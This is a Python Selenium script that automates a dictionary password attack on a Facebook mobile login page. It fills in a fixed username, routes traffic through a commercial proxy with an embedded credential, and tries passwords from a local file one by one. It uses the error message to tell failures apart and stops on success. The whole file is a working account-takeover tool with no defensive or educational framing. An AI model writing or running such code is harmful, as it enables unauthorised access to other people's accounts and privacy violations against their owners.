# /usr/bin/python
# Facebook Autologin password from dictionary with selenium proxy
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.edge.options import Options
from selenium.webdriver.common.proxy import Proxy, ProxyType
import time
import requests
# Configure the HTTP proxy details
proxy_host = 'smartproxy.crawlbase.com'
proxy_port = 8012
proxy_username = 'x7U6TavjC6ICEeeQerlEXQ'
# proxies = {"http": f"http://{proxy_username}@{proxy_host}:{proxy_port}/", "https": f"http://{proxy_username}@{proxy_host}:{proxy_port}/"}
# Configure the Selenium WebDriver with the proxy
options = webdriver.EdgeOptions()
options.use_chromium = True
options.add_argument("--remote-debugging-port=9222") 
options.add_experimental_option("debuggerAddress", "localhost:9222") # this line is important to open the recent window of Edge browser
# options.add_argument(f"--proxy-server={proxy_username}@{proxy_host}:{proxy_port}")
proxy = Proxy()
proxy.proxy_type = ProxyType.MANUAL
proxy.http_proxy = f"{proxy_username}@{proxy_host}:{proxy_port}"
proxy.ssl_proxy = f"{proxy_username}@{proxy_host}:{proxy_port}"
options.add_argument('--proxy-server={}'.format(proxy.http_proxy))
driver = webdriver.Edge(options=options)
window_handles = driver.window_handles
# Switch to the second tab
driver.switch_to.window(window_handles[0]) # 0 is the first tab, 1 is the second tab
driver.get('https://mobile.facebook.com/login/')
# remove username and password suggestions
driver.execute_script("document.getElementById('m_login_email').setAttribute('autocomplete', 'off')")
driver.execute_script("document.getElementById('m_login_password').setAttribute('autocomplete', 'off')")
username = driver.find_element(By.NAME, 'email')
username.clear()
username.send_keys('ney.mend')
pass_count = 0
passwords = []
# array of passwords from passwords.txt
with open('C:/Users/jeral/Documents/MyPython_Devs/passwords.txt', 'r') as f:
    # escape the empty lines
    passwords = [line.rstrip('\n') for line in f if line != '\n']
    print(passwords)
    print(len(passwords))
# print(passwords)
# print(len(passwords))
# print(passwords[0])
while True:
    password = driver.find_element(By.NAME, 'pass')
    password.clear()
    password.send_keys(passwords[pass_count])
    driver.find_element(By.NAME, 'login').click()
    print("Login button clicked")
    time.sleep(5)
    # the class response for incorrect password is _8qcx ="Try again with different login info"
    response = driver.find_element(By.ID, 'login_error')
    # get the span text of the response <span>
    span = response.find_element(By.TAG_NAME, 'span')
    # print(span.text)
    if span.text == "Incorrect password. Did you forget your password?":
        print("Incorrect password: {}".format(passwords[pass_count]))
        # username.clear()
        password.clear()
        pass_count += 1   
    else:
        print("Correct password")
        break
